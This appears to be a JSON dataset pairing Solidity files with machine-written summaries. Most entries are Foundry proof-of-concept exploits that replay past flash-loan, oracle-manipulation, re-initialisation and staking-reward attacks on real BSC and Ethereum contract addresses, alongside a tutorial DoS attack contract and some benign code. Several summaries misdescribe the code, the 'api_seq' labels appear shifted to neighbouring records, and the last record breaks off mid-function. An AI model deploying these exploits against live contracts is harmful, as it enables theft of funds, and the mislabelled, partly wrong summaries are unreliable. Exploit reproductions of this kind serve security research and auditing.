        "code": "// SPDX-License-Identifier: MIT\n// ERC721A Contracts v4.2.3\n// Creators: Chiru Labs\n\npragma solidity ^0.8.4;\n\ncontract DirectBurnBitSetterHelper {\n    function directSetBurnBit(uint256 index) public virtual {\n        bytes32 erc721aDiamondStorageSlot = keccak256('openzepplin.contracts.storage.ERC721A');\n\n        // This is `_BITMASK_BURNED` from ERC721A.\n        uint256 bitmaskBurned = 1 << 224;\n        // We use assembly to directly access the private mapping.\n        assembly {\n            // The `_packedOwnerships` mapping is at slot 4.\n            mstore(0x20, 4)\n            mstore(0x00, index)\n            let ownershipStorageSlot := keccak256(0x00, 0x40)\n            sstore(ownershipStorageSlot, or(sload(ownershipStorageSlot), bitmaskBurned))\n\n            // For diamond storage, we'll simply add the offset of the layout struct.\n            mstore(0x20, add(erc721aDiamondStorageSlot, 4))\n            mstore(0x00, index)\n            ownershipStorageSlot := keccak256(0x00, 0x40)\n            sstore(ownershipStorageSlot, or(sload(ownershipStorageSlot), bitmaskBurned))\n        }\n    }\n}\n",
        "summary": "This code defines a Solidity contract `DirectBurnBitSetterHelper` with a function `directSetBurnBit(index)`. The function sets the `_BITMASK_BURNED` flag for a given index in the `_packedOwnerships` mapping in the storage of a contract that has a storage slot for the `ERC721A` openzepplin contract. It uses assembly code to directly access the private mapping and set the flag using bitwise OR operation with a bit mask. The offset of the storage slot is calculated using the `keccak256` hash function. The SPDX license identifier, version number, and creator information are also provided in the code.",
        "id": "f39cea69-0e39-4ffd-81e3-f3f648507496",
        "api_seq": "Discover_exp"
    },
    {
        "code": "// SPDX-License-Identifier: UNLICENSED\npragma solidity 0.8.10;\n\nimport \"forge-std/Test.sol\";\nimport \"./interface.sol\";\n\ninterface ETHpledge {\n  function pledgein(address fatheraddr, uint256 amountt)\n    external\n    returns (bool);\n}\n// Expected error. [FAIL. Reason: Pancake: INSUFFICIENT_INPUT_AMOUNT] \n// Because we don't repay funds to pancake.\n\ncontract ContractTest is DSTest {\n  IPancakePair PancakePair =\n    IPancakePair(0x7EFaEf62fDdCCa950418312c6C91Aef321375A00);\n  IPancakePair PancakePair2 =\n    IPancakePair(0x92f961B6bb19D35eedc1e174693aAbA85Ad2425d);\n  IERC20 busd = IERC20(0x55d398326f99059fF775485246999027B3197955);\n  IERC20 discover = IERC20(0x5908E4650bA07a9cf9ef9FD55854D4e1b700A267);\n  ETHpledge ethpledge = ETHpledge(0xe732a7bD6706CBD6834B300D7c56a8D2096723A7);\n  CheatCodes cheats = CheatCodes(0x7109709ECfa91a80626fF3989D68f67F5b1DD12D);\n\n  constructor() {\n    cheats.createSelectFork(\"bsc\", 18446845); // fork bsc at block 18446845\n\n    busd.approve(address(ethpledge), type(uint256).max);\n    discover.approve(address(ethpledge), type(uint256).max);\n  }\n\n  function testExploit() public {\n    bytes memory data = abi.encode(address(this), 19810777285664651588959);\n    emit log_named_uint(\n      \"Before flashswap, BUSD balance of attacker:\",\n      busd.balanceOf(address(this))\n    );\n    PancakePair2.swap(19810777285664651588959, 0, address(this), data);\n  }\n\n  function pancakeCall(\n    address sender,\n    uint256 amount0,\n    uint256 amount1,\n    bytes calldata data\n  ) public {\n    emit log_named_uint(\n      \"After flashswap, BUSD balance of attacker:\",\n      busd.balanceOf(address(this))\n    );\n    ethpledge.pledgein(\n      0xAb21300fA507Ab30D50c3A5D1Cad617c19E83930,\n      2000000000000000000000\n    );\n    emit log_named_uint(\n      \"After Exploit, discover balance of attacker:\",\n      discover.balanceOf(0xAb21300fA507Ab30D50c3A5D1Cad617c19E83930)\n    );\n  }\n\n  receive() external payable {}\n}",
        "summary": "This code is written in Solidity and starts with the declaration of a license and importing of other Solidity contracts. The contract defines an interface called ETHpledge and a contract called ContractTest. The interface is used to interact with another contract's functions using its address while the contract has several variables, each representing a different contract. It also defines a constructor that sets up the approval for the exchange of certain tokens.\n\nThe ContractTest has a function called testExploit that calls the swap function of a pancake pair smart contract and passes it some data. The pancakeCall function is called after testExploit by the PancakePair2 smart contract, logs the balance of the attacker's BUSD token, approves an Ethereum pledge for a certain amount and then logs the balance of the attacker's Discover token. The receive function is used to receive Ether.",
        "id": "8cbcc527-7b35-4cee-a346-71d7eb42e94b",
        "api_seq": "DKP_exp"
    },
    {
        "code": "// SPDX-License-Identifier: UNLICENSED\npragma solidity ^0.8.10;\n\nimport \"forge-std/Test.sol\";\nimport \"./interface.sol\";\n\n// @Analysis\n// https://twitter.com/CertiKAlert/status/1633421908996763648\n// @TX\n// https://bscscan.com/tx/0x0c850f54c1b497c077109b3d2ef13c042bb70f7f697201bcf2a4d0cb95e74271\n// https://bscscan.com/tx/0x2d31e45dce58572a99c51357164dc5283ff0c02d609250df1e6f4248bd62ee01\n// @Summary\n// There is an exchange method in the 0x89257 closed source contract for users to swap USDT for DKP tokens,\n// but the price Oracle used is the ratio of the balance of the two tokens in the USDT-DKP pair,\n// and the attacker manipulates this price through flashLoan, swapping a very small amount of USDT for a large amount of DKP and selling it for a profit\n\ninterface IDKPExchange {\n    function exchange(uint256 amount) external;\n}\n\ncontract ContractTest is Test {\n    IERC20 DKP = IERC20(0xd06fa1BA7c80F8e113c2dc669A23A9524775cF19);\n    IERC20 USDT = IERC20(0x55d398326f99059fF775485246999027B3197955);\n    Uni_Pair_V2 Pair = Uni_Pair_V2(0xBE654FA75bAD4Fd82D3611391fDa6628bB000CC7);\n    Uni_Router_V2 Router = Uni_Router_V2(0x10ED43C718714eb63d5aA57B78B54704E256024E);\n    IDKPExchange DKPExchange = IDKPExchange(0x89257A52Ad585Aacb1137fCc8abbD03a963B9683);\n\n    CheatCodes cheats = CheatCodes(0x7109709ECfa91a80626fF3989D68f67F5b1DD12D);\n\n    function setUp() public {\n        cheats.createSelectFork(\"bsc\", 26_284_131);\n        cheats.label(address(DKP), \"DKP\");\n        cheats.label(address(USDT), \"USDT\");\n        cheats.label(address(Pair), \"Pair\");\n        cheats.label(address(Router), \"Router\");\n        cheats.label(address(DKPExchange), \"DKPExchange\");\n    }\n\n    function testExploit() public {\n        deal(address(USDT), address(this), 800 * 1e18);\n        exchangeDKP();\n        DKPToUSDT();\n\n        emit log_named_decimal_uint(\n            \"Attacker USDT balance after exploit\", USDT.balanceOf(address(this)) - 800 * 1e18, USDT.decimals()\n            );\n    }\n\n    function exchangeDKP() internal {\n        uint256 flashAmount = USDT.balanceOf(address(Pair)) * 9992 / 10_000;\n        Pair.swap(flashAmount, 0, address(this), abi.encode(flashAmount));\n    }\n\n    function pancakeCall(address sender, uint256 amount0, uint256 amount1, bytes calldata data) external {\n        bytes memory contractByteCode = type(ExchangeDKP).creationCode;\n        uint256 salt = uint256(keccak256(\"salt\"));\n        address receiver = getAddress(contractByteCode, salt);\n        USDT.transfer(receiver, 100 * 1e18);\n        new ExchangeDKP{salt: keccak256(\"salt\")}();\n        uint256 returnAmount = abi.decode(data, (uint256)) * 10_000 / 9975 + 1000;\n        USDT.transfer(address(Pair), returnAmount);\n    }\n\n    function DKPToUSDT() internal {\n        DKP.approve(address(Router), type(uint256).max);\n        address[] memory path = new address[](2);\n        path[0] = address(DKP);\n        path[1] = address(USDT);\n        Router.swapExactTokensForTokensSupportingFeeOnTransferTokens(\n            DKP.balanceOf(address(this)), 0, path, address(this), block.timestamp\n        );\n    }\n\n    function getAddress(bytes memory bytecode, uint256 _salt) public view returns (address) {\n        bytes32 hash = keccak256(abi.encodePacked(bytes1(0xff), address(this), _salt, keccak256(bytecode)));\n        return address(uint160(uint256(hash)));\n    }\n}\n\ncontract ExchangeDKP {\n    IERC20 USDT = IERC20(0x55d398326f99059fF775485246999027B3197955);\n    IERC20 DKP = IERC20(0xd06fa1BA7c80F8e113c2dc669A23A9524775cF19);\n    IDKPExchange DKPExchange = IDKPExchange(0x89257A52Ad585Aacb1137fCc8abbD03a963B9683);\n\n    constructor() {\n        USDT.approve(address(DKPExchange), type(uint256).max);\n        DKPExchange.exchange(100 * 1e18);\n        DKP.transfer(msg.sender, DKP.balanceOf(address(this)));\n    }\n}\n",
        "summary": "This code is a Solidity smart contract that exploits a vulnerability in the 0x89257 closed source contract. The vulnerability allows an attacker to manipulate the price Oracle used to swap USDT for DKP tokens using flash loans. The attacker swaps a very small amount of USDT for a large amount of DKP, sells it for a profit, and returns the flash loan. The contract sets up testing and labeling for the various tokens used in the exploit, and defines functions for swapping tokens, calling the exploit, and converting DKP back into USDT. It also includes a separate contract, ExchangeDKP, which facilitates the exploit by exchanging USDT for DKP.",
        "id": "8471ed47-ba56-494d-8141-957d5d9900c9",
        "api_seq": "dodo_flashloan_exp"
    },
    {
        "code": "// SPDX-License-Identifier: UNLICENSED\n// !! THIS FILE WAS AUTOGENERATED BY abi-to-sol v0.5.3. SEE SOURCE BELOW. !!\npragma solidity >=0.7.0 <0.9.0;\n\nimport \"forge-std/Test.sol\";\nimport \"./interface.sol\";\n\ncontract ContractTest is DSTest {\n  uint256 wCRES_amount = 130000000000000000000000;\n\n  uint256 usdt_amount = 1100000000000;\n\n  IERC20 wCRES_token = IERC20(0xa0afAA285Ce85974c3C881256cB7F225e3A1178a);\n\n  USDT usdt_token = USDT(0xdAC17F958D2ee523a2206206994597C13D831ec7);\n  address maintainer = 0x95C4F5b83aA70810D4f142d58e5F7242Bd891CB0;\n  DVM dvm = DVM(0x051EBD717311350f1684f89335bed4ABd083a2b6);\n  address mtFeeRateModel = 0x5e84190a270333aCe5B9202a3F4ceBf11b81bB01;\n  uint256 lpFeeRate = 3000000000000000;\n  address mywallet = msg.sender;\n  uint256 i = 1;\n  uint256 k = 1000000000000000000;\n  bool isOpenTWAP = false;\n  address token1 = 0x7f4E7fB900E0EC043718d05caEe549805CaB22C8;\n  address token2 = 0xf2dF8794f8F99f1Ba4D8aDc468EbfF2e47Cd7010;\n  CheatCodes cheats = CheatCodes(0x7109709ECfa91a80626fF3989D68f67F5b1DD12D);\n\n  function setUp() public {\n    cheats.createSelectFork(\"mainnet\", 12000000); // fork mainnet block number 12000000\n  }\n\n  function testExploit() public {\n    address me = address(this);\n    dvm.flashLoan(wCRES_amount, usdt_amount, me, \"whatever\");\n\n    //emit log_named_uint(\"Exploit completed, WBNB Balance\",wbnb.balanceOf(mywallet));\n  }\n\n  function DVMFlashLoanCall(\n    address a,\n    uint256 b,\n    uint256 c,\n    bytes memory d\n  ) public {\n    emit log_named_uint(\n      \"FlashLoan WBNB Balance\",\n      wCRES_token.balanceOf(address(this))\n    );\n    dvm.init(\n      maintainer,\n      token1,\n      token2,\n      lpFeeRate,\n      mtFeeRateModel,\n      i,\n      k,\n      isOpenTWAP\n    );\n    wCRES_token.transfer(mywallet, wCRES_token.balanceOf(address(this)));\n    usdt_token.transfer(mywallet, usdt_token.balanceOf(address(this)));\n\n    emit log_named_uint(\n      \"After Exploit completed, wCRES Balance\",\n      wCRES_token.balanceOf(mywallet)\n    );\n    usdt_token.transfer(mywallet, usdt_token.balanceOf(address(this)));\n    emit log_named_uint(\n      \"After Exploit completed, USDT Balance\",\n      usdt_token.balanceOf(mywallet)\n    );\n  }\n}\n",
        "summary": "This is a smart contract written in Solidity that includes a test function to exploit a flash loan attack on the Decentralized Vulnerability Market (DVM). The `setUp` function sets up the cheat codes to fork a specific block number on the mainnet. The `testExploit` function is the main entry point that initiates the flash loan attack using the `wCRES_amount` and `usdt_amount` passed to DVM's `flashLoan` function. The `DVMFlashLoanCall` function is then called to transfer the exploited tokens to the attacker's wallet. The other variables in the contract are used for storing addresses and configuration options for the test exploit.",
        "id": "e86e4522-479f-477f-9e99-a2b651b6c2c4",
        "api_seq": "DoS"
    },
    {
        "code": "// SPDX-License-Identifier: MIT\npragma solidity ^0.8.4;\n\n// \u6709DoS\u6f0f\u6d1e\u7684\u6e38\u620f\uff0c\u73a9\u5bb6\u4eec\u5148\u5b58\u94b1\uff0c\u6e38\u620f\u7ed3\u675f\u540e\uff0c\u8c03\u7528deposit\u9000\u94b1\u3002\ncontract DoSGame {\n    bool public refundFinished;\n    mapping(address => uint256) public balanceOf;\n    address[] public players;\n    \n    // \u6240\u6709\u73a9\u5bb6\u5b58ETH\u5230\u5408\u7ea6\u91cc\n    function deposit() external payable {\n        require(!refundFinished, \"Game Over\");\n        require(msg.value > 0, \"Please donate ETH\");\n        // \u8bb0\u5f55\u5b58\u6b3e\n        balanceOf[msg.sender] = msg.value;\n        // \u8bb0\u5f55\u73a9\u5bb6\u5730\u5740\n        players.push(msg.sender);\n    }\n\n    // \u6e38\u620f\u7ed3\u675f\uff0c\u9000\u6b3e\u5f00\u59cb\uff0c\u6240\u6709\u73a9\u5bb6\u5c06\u4f9d\u6b21\u6536\u5230\u9000\u6b3e\n    function refund() external {\n        require(!refundFinished, \"Game Over\");\n        uint256 pLength = players.length;\n        // \u901a\u8fc7\u5faa\u73af\u7ed9\u6240\u6709\u73a9\u5bb6\u9000\u6b3e\n        for(uint256 i; i < pLength; i++){\n            address player = players[i];\n            uint256 refundETH = balanceOf[player];\n            (bool success, ) = player.call{value: refundETH}(\"\");\n            require(success, \"Refund Fail!\");\n            balanceOf[player] = 0;\n        }\n        refundFinished = true;\n    }\n\n    function balance() external view returns(uint256){\n        return address(this).balance;\n    }\n}\n\ncontract Attack {\n    // \u9000\u6b3e\u65f6\u8fdb\u884cDoS\u653b\u51fb\n    fallback() external payable{\n        revert(\"DoS Attack!\");\n    }\n\n    // \u53c2\u4e0eDoS\u6e38\u620f\u5e76\u5b58\u6b3e\n    function attack(address gameAddr) external payable {\n        DoSGame dos = DoSGame(gameAddr);\n        dos.deposit{value: msg.value}();\n    }\n}",
        "summary": "This code is for a game contract called DoSGame, where players deposit ETH and then call the refund function to receive a refund of their deposit. The Attack contract is designed to exploit a Denial of Service (DoS) vulnerability in the DoSGame contract. The attack is triggered when refunding by reverting the transaction every time. The DoSGame contract does not have sufficient checks in place to prevent multiple calls to the refund function, causing it to fail and trapping the deposited funds in the contract.",
        "id": "76194a13-da27-40b3-89b7-57bd0395295f",
        "api_seq": "DPC_exp"
    },
    {
        "code": "pragma solidity ^0.8.10;\n\nimport \"forge-std/Test.sol\";\nimport \"./interface.sol\";\n\ninterface IPair{\n    function approve(address, uint256) external;\n    function balanceOf(address) external returns (uint256);\n}\n\ninterface IDPC{\n    function approve(address, uint256) external;\n    function balanceOf(address) external returns (uint256);\n    function tokenAirdrop(address, address, uint) external;\n    function stakeLp(address, address, uint256) external;\n    function claimStakeLp(address, uint256) external;\n    function claimDpcAirdrop(address) external;\n}\n\ncontract ContractTest is DSTest{\n\n    IDPC DPC = IDPC(0xB75cA3C3e99747d0e2F6e75A9fBD17F5Ac03cebE);\n    IERC20 WBNB = IERC20(0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c);\n    IERC20 USDT = IERC20(0x55d398326f99059fF775485246999027B3197955);\n    IPair Pair =IPair(0x79cD24Ed4524373aF6e047556018b1440CF04be3);\n    IPancakeRouter Router = IPancakeRouter(payable(0x10ED43C718714eb63d5aA57B78B54704E256024E));\n    CheatCodes cheats = CheatCodes(0x7109709ECfa91a80626fF3989D68f67F5b1DD12D);\n\n    function setUp() public {\n        cheats.createSelectFork(\"bsc\", 21179209); \n    }\n\n    function testExploit() external {\n\n        emit log_named_decimal_uint(\n            \"[Start] Attacker WBNB balance before exploit\",\n            WBNB.balanceOf(address(this)),\n            18\n        );\n\n        DPC.approve(address(Router), ~uint256(0));\n        USDT.approve(address(DPC), ~uint256(0));\n        USDT.approve(address(Router), ~uint256(0));\n        Pair.approve(address(DPC), ~uint256(0));\n        WBNB.approve(address(Router), ~uint(256));\n\n        address(WBNB).call{value: 2 ether}(\"\");\n        WBNBToUSDT();\n        USDTToDPC();\n        DPC.tokenAirdrop(address(this), address(DPC), 100);\n        addDPCLiquidity();\n        DPC.stakeLp(address(this), address(DPC), Pair.balanceOf(address(this)));    \n\n        cheats.warp(block.timestamp + 24 * 60 * 60); //spend time\n\n        for(uint i = 0; i < 9; i++){\n            DPC.claimStakeLp(address(this), 1);\n        }\n        DPC.claimDpcAirdrop(address(this));    \n        DPCToWBNB();\n        \n         emit log_named_decimal_uint(\n            \"[End] Attacker WBNB balance after exploit\",\n            WBNB.balanceOf(address(this)),\n            18\n        );\n    }\n\n    function WBNBToUSDT() public {\n        address[] memory path = new address[](2);\n        path[0] = address(WBNB);\n        path[1] = address(USDT);\n        Router.swapExactTokensForTokens(\n            WBNB.balanceOf(address(this)),\n            0,\n            path,\n            address(this),\n            block.timestamp\n        );\n    } \n\n    function USDTToDPC() public {\n        address[] memory path = new address[](2);\n        path[0] = address(USDT);\n        path[1] = address(DPC);\n        Router.swapExactTokensForTokens(\n            USDT.balanceOf(address(this)) / 2,\n            0,\n            path,\n            address(this),\n            block.timestamp\n        );\n    }\n\n    function addDPCLiquidity() public {\n        Router.addLiquidity(\n            address(USDT),\n            address(DPC),\n            USDT.balanceOf(address(this)),\n            DPC.balanceOf(address(this)),\n            0,\n            0,\n            address(this),\n            block.timestamp\n        );\n    }\n    \n    function DPCToWBNB() public {\n        address[] memory path = new address[](3);\n        path[0] = address(DPC);\n        path[1] = address(USDT);\n        path[2] = address(WBNB);\n        Router.swapExactTokensForTokensSupportingFeeOnTransferTokens(\n            DPC.balanceOf(address(this)),\n            0,\n            path,\n            address(this),\n            block.timestamp\n        );\n    }\n}",
        "summary": "The code defines a Solidity smart contract `ContractTest` that interacts with other smart contracts and interfaces to perform an exploit. The exploit involves swapping Binance Coin (BNB) for USDT, then USDT for DeepCoin (DPC), then adding DPC liquidity to a pool, staking that liquidity, and claiming rewards. The exploit also involves calling a `warp` function to advance time by a day (24 hours) in the blockchain. The ultimate goal of the exploit is to convert DPC back to BNB and profit from the price difference. The contract uses various interfaces and contracts to achieve this, imported through other Solidity files and interfaces. The contract also includes a `DSTest` named `setUp` function and a `testExploit` function as part of the contract tests.",
        "id": "cc7e64b6-e964-46a2-8840-ea9591a87172",
        "api_seq": "DSTestPlus.t"
    },
    {
        "code": "// SPDX-License-Identifier: AGPL-3.0-only\npragma solidity 0.8.15;\n\nimport {DSTestPlus} from \"./utils/DSTestPlus.sol\";\n\ncontract DSTestPlusTest is DSTestPlus {\n    function testBound() public {\n        assertEq(bound(0, 69, 69), 69);\n        assertEq(bound(0, 68, 69), 68);\n        assertEq(bound(5, 0, 4), 0);\n        assertEq(bound(9999, 1337, 6666), 6006);\n        assertEq(bound(0, type(uint256).max - 6, type(uint256).max), type(uint256).max - 6);\n        assertEq(bound(6, type(uint256).max - 6, type(uint256).max), type(uint256).max);\n    }\n\n    function testFailBoundMinBiggerThanMax() public {\n        bound(5, 100, 10);\n    }\n\n    function testRelApproxEqBothZeroesPasses() public {\n        assertRelApproxEq(0, 0, 1e18);\n        assertRelApproxEq(0, 0, 0);\n    }\n\n    function testBound(\n        uint256 num,\n        uint256 min,\n        uint256 max\n    ) public {\n        if (min > max) (min, max) = (max, min);\n\n        uint256 bounded = bound(num, min, max);\n\n        assertGe(bounded, min);\n        assertLe(bounded, max);\n    }\n\n    function testFailBoundMinBiggerThanMax(\n        uint256 num,\n        uint256 min,\n        uint256 max\n    ) public {\n        if (max == min) {\n            unchecked {\n                min++; // Overflow is handled below.\n            }\n        }\n\n        if (max > min) (min, max) = (max, min);\n\n        bound(num, min, max);\n    }\n\n    function testBrutalizeMemory() public brutalizeMemory(\"FEEDFACECAFEBEEFFEEDFACECAFEBEEF\") {\n        bytes32 scratchSpace1;\n        bytes32 scratchSpace2;\n        bytes32 freeMem1;\n        bytes32 freeMem2;\n\n        assembly {\n            scratchSpace1 := mload(0)\n            scratchSpace2 := mload(32)\n            freeMem1 := mload(mload(0x40))\n            freeMem2 := mload(add(mload(0x40), 32))\n        }\n\n        assertGt(uint256(freeMem1), 0);\n        assertGt(uint256(freeMem2), 0);\n        assertGt(uint256(scratchSpace1), 0);\n        assertGt(uint256(scratchSpace2), 0);\n    }\n}\n",
        "summary": "This is a Solidity smart contract that tests the functionality of the DSTestPlus library. The contract includes several functions that test different features of the library, such as the bound function which returns the input number within the specified range, the assertRelApproxEq function which checks if two numbers are approximately equal within a given relative tolerance, and the brutalizeMemory function which tests the ability to allocate and free memory. The contract also imports the DSTestPlus library which provides additional testing utilities.",
        "id": "66e0d3cd-3748-4cf6-807d-92027a0b1fa3",
        "api_seq": "DutchAuction"
    },
    {
        "code": "// SPDX-License-Identifier: MIT\npragma solidity ^0.8.4;\n\nimport \"@openzeppelin/contracts/access/Ownable.sol\";\nimport \"../34_ERC721/ERC721.sol\";\n\ncontract DutchAuction is Ownable, ERC721 {\n    uint256 public constant COLLECTOIN_SIZE = 10000; // NFT\u603b\u6570\n    uint256 public constant AUCTION_START_PRICE = 1 ether; // \u8d77\u62cd\u4ef7\n    uint256 public constant AUCTION_END_PRICE = 0.1 ether; // \u7ed3\u675f\u4ef7\uff08\u6700\u4f4e\u4ef7\uff09\n    uint256 public constant AUCTION_TIME = 10 minutes; // \u62cd\u5356\u65f6\u95f4\uff0c\u4e3a\u4e86\u6d4b\u8bd5\u65b9\u4fbf\u8bbe\u4e3a10\u5206\u949f\n    uint256 public constant AUCTION_DROP_INTERVAL = 1 minutes; // \u6bcf\u8fc7\u591a\u4e45\u65f6\u95f4\uff0c\u4ef7\u683c\u8870\u51cf\u4e00\u6b21\n    uint256 public constant AUCTION_DROP_PER_STEP =\n        (AUCTION_START_PRICE - AUCTION_END_PRICE) /\n        (AUCTION_TIME / AUCTION_DROP_INTERVAL); // \u6bcf\u6b21\u4ef7\u683c\u8870\u51cf\u6b65\u957f\n    \n    uint256 public auctionStartTime; // \u62cd\u5356\u5f00\u59cb\u65f6\u95f4\u6233\n    string private _baseTokenURI;   // metadata URI\n    uint256[] private _allTokens; // \u8bb0\u5f55\u6240\u6709\u5b58\u5728\u7684tokenId \n\n    //\u8bbe\u5b9a\u62cd\u5356\u8d77\u59cb\u65f6\u95f4\uff1a\u6211\u4eec\u5728\u6784\u9020\u51fd\u6570\u4e2d\u4f1a\u58f0\u660e\u5f53\u524d\u533a\u5757\u65f6\u95f4\u4e3a\u8d77\u59cb\u65f6\u95f4\uff0c\u9879\u76ee\u65b9\u4e5f\u53ef\u4ee5\u901a\u8fc7`setAuctionStartTime(uint32)`\u51fd\u6570\u6765\u8c03\u6574\n    constructor() ERC721(\"WTF Dutch Auctoin\", \"WTF Dutch Auctoin\") {\n        auctionStartTime = block.timestamp;\n    }\n\n    /**\n     * ERC721Enumerable\u4e2dtotalSupply\u51fd\u6570\u7684\u5b9e\u73b0\n     */\n    function totalSupply() public view virtual returns (uint256) {\n        return _allTokens.length;\n    }\n\n    /**\n     * Private\u51fd\u6570\uff0c\u5728_allTokens\u4e2d\u6dfb\u52a0\u4e00\u4e2a\u65b0\u7684token\n     */\n    function _addTokenToAllTokensEnumeration(uint256 tokenId) private {\n        _allTokens.push(tokenId);\n    }\n\n    // \u62cd\u5356mint\u51fd\u6570\n    function auctionMint(uint256 quantity) external payable{\n        uint256 _saleStartTime = uint256(auctionStartTime); // \u5efa\u7acblocal\u53d8\u91cf\uff0c\u51cf\u5c11gas\u82b1\u8d39\n        require(\n        _saleStartTime != 0 && block.timestamp >= _saleStartTime,\n        \"sale has not started yet\"\n        ); // \u68c0\u67e5\u662f\u5426\u8bbe\u7f6e\u8d77\u62cd\u65f6\u95f4\uff0c\u62cd\u5356\u662f\u5426\u5f00\u59cb\n        require(\n        totalSupply() + quantity <= COLLECTOIN_SIZE,\n        \"not enough remaining reserved for auction to support desired mint amount\"\n        ); // \u68c0\u67e5\u662f\u5426\u8d85\u8fc7NFT\u4e0a\u9650\n\n        uint256 totalCost = getAuctionPrice() * quantity; // \u8ba1\u7b97mint\u6210\u672c\n        require(msg.value >= totalCost, \"Need to send more ETH.\"); // \u68c0\u67e5\u7528\u6237\u662f\u5426\u652f\u4ed8\u8db3\u591fETH\n        \n        // Mint NFT\n        for(uint256 i = 0; i < quantity; i++) {\n            uint256 mintIndex = totalSupply();\n            _mint(msg.sender, mintIndex);\n            _addTokenToAllTokensEnumeration(mintIndex);\n        }\n        // \u591a\u4f59ETH\u9000\u6b3e\n        if (msg.value > totalCost) {\n            payable(msg.sender).transfer(msg.value - totalCost); //\u6ce8\u610f\u4e00\u4e0b\u8fd9\u91cc\u662f\u5426\u6709\u91cd\u5165\u7684\u98ce\u9669\n        }\n    }\n\n    // \u83b7\u53d6\u62cd\u5356\u5b9e\u65f6\u4ef7\u683c\n    function getAuctionPrice()\n        public\n        view\n        returns (uint256)\n    {\n        if (block.timestamp < auctionStartTime) {\n        return AUCTION_START_PRICE;\n        }else if (block.timestamp - auctionStartTime >= AUCTION_TIME) {\n        return AUCTION_END_PRICE;\n        } else {\n        uint256 steps = (block.timestamp - auctionStartTime) /\n            AUCTION_DROP_INTERVAL;\n        return AUCTION_START_PRICE - (steps * AUCTION_DROP_PER_STEP);\n        }\n    }\n\n    // auctionStartTime setter\u51fd\u6570\uff0conlyOwner\n    function setAuctionStartTime(uint32 timestamp) external onlyOwner {\n        auctionStartTime = timestamp;\n    }\n\n    // BaseURI\n    function _baseURI() internal view virtual override returns (string memory) {\n        return _baseTokenURI;\n    }\n    // BaseURI setter\u51fd\u6570, onlyOwner\n    function setBaseURI(string calldata baseURI) external onlyOwner {\n        _baseTokenURI = baseURI;\n    }\n    // \u63d0\u6b3e\u51fd\u6570\uff0conlyOwner\n    function withdrawMoney() external onlyOwner {\n        (bool success, ) = msg.sender.call{value: address(this).balance}(\"\");\n        require(success, \"Transfer failed.\");\n    }\n}\n",
        "summary": "This code defines a contract called \"DutchAuction\" that inherits from Ownable and ERC721. The contract allows users to mint new ERC721 tokens in a Dutch auction format, with the starting price, ending price, and decay rate all pre-determined. The contract keeps track of the total number of tokens minted and allows the owner to set the base URI for metadata and withdraw funds. The contract also includes several modifiers to restrict access to certain functions to only the contract owner.",
        "id": "8a40ef9a-5e9a-49ed-9df2-fdb84f44ce85",
        "api_seq": "DYNA_exp"
    },
    {
        "code": "// SPDX-License-Identifier: UNLICENSED\npragma solidity ^0.8.10;\n\nimport \"forge-std/Test.sol\";\nimport \"./interface.sol\";\n\n// @Analysis\n// https://twitter.com/BlockSecTeam/status/1628319536117153794\n// https://twitter.com/BeosinAlert/status/1628301635834486784\n// @TX\n// https://bscscan.com/tx/0x06bbe093d9b84783b8ca92abab5eb8590cb2321285660f9b2a529d665d3f18e4\n// https://bscscan.com/tx/0xc09678fec49c643a30fc8e4dec36d0507dae7e9123c270e1f073d335deab6cf0\n\ninterface IStakingDYNA {\n    function deposit(uint256 _stakeAmount) external;\n    function redeem(uint256 _redeemAmount) external;\n}\n\ninterface IDYNA is IERC20 {\n    function _setMaxSoldAmount(uint256 maxvalue) external;\n    function _maxSoldAmount() external view returns(uint256);\n}\n\ncontract StakingReward {\n    IERC20 DYNA = IERC20(0x5c0d0111ffc638802c9EfCcF55934D5C63aB3f79);\n    IStakingDYNA StakingDYNA = IStakingDYNA(0xa7B5eabC3Ee82c585f5F4ccC26b81c3Bd62Ff3a9);\n    address Owner;\n\n    constructor(address owner) {\n        Owner = owner;\n        DYNA.approve(address(StakingDYNA), type(uint).max);\n    }\n\n    function deposit(uint256 amount) external {\n        StakingDYNA.deposit(amount);\n    }\n\n    function withdraw(uint256 amount) external {\n        StakingDYNA.redeem(amount);\n        DYNA.transfer(Owner, DYNA.balanceOf(address(this)));\n    }\n}\n\ncontract ContractTest is Test {\n    IDYNA DYNA = IDYNA(0x5c0d0111ffc638802c9EfCcF55934D5C63aB3f79);\n    IERC20 WBNB = IERC20(0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c);\n    IStakingDYNA StakingDYNA = IStakingDYNA(0xa7B5eabC3Ee82c585f5F4ccC26b81c3Bd62Ff3a9);\n    Uni_Router_V2 Router = Uni_Router_V2(0x10ED43C718714eb63d5aA57B78B54704E256024E);\n    Uni_Pair_V2 Pair = Uni_Pair_V2(0xb6148c6fA6Ebdd6e22eF5150c5C3ceE78b24a3a0);\n    StakingReward stakingReward;\n    StakingReward[] StakingRewardList;\n    uint256 flashLoanAmount;\n    address DYNAOwner = 0xA8Ff6C807654c5B2B55f188e9a7Ce31C8d192353;\n\n    CheatCodes cheats = CheatCodes(0x7109709ECfa91a80626fF3989D68f67F5b1DD12D);\n\n    function setUp() public {\n        cheats.createSelectFork(\"bsc\", 25879486);\n        cheats.label(address(DYNA), \"DYNA\");\n        cheats.label(address(WBNB), \"WBNB\");\n        cheats.label(address(Router), \"Router\");\n        cheats.label(address(Pair), \"Pair\");\n        cheats.label(address(StakingDYNA), \"StakingDYNA\");\n    }\n\n    function testExploit() external {\n        StakingRewardFactory();\n        DYNA.transfer(address(Pair), 1); //\n        DYNA.transfer(tx.origin, 1e17);  //\n        cheats.startPrank(tx.origin);    // Bypass Sold Amount Limit\n        DYNA.transfer(address(Pair), 1); //\n        cheats.stopPrank();              //\n        cheats.warp(block.timestamp + 7 * 24 * 60 * 60); // deposit a week ago\n        flashLoanAmount = DYNA.balanceOf(address(Pair)) - 3;\n        Pair.swap(flashLoanAmount, 0, address(this), new bytes(1));\n        DYNAToWBNB();\n\n        emit log_named_decimal_uint(\"Attacker WBNB balance after exploit\", WBNB.balanceOf(address(this)), 18);\n    }\n\n    function StakingRewardFactory() internal {\n        deal(address(DYNA), address(this), 1001 * 1e18);\n        uint256 preStakingRewardAmount = 1000 * 1e18 / 200;\n        for(uint256 i; i < 200; ++i){\n            stakingReward = new StakingReward(address(this));\n            DYNA.transfer(address(stakingReward), preStakingRewardAmount);\n            stakingReward.deposit(preStakingRewardAmount);\n            StakingRewardList.push(stakingReward);\n        }\n    }\n\n    function pancakeCall(address sender, uint256 amount0, uint256 amount1, bytes calldata data) external {\n        uint256 listLength = StakingRewardList.length;\n        for(uint i; i < listLength; 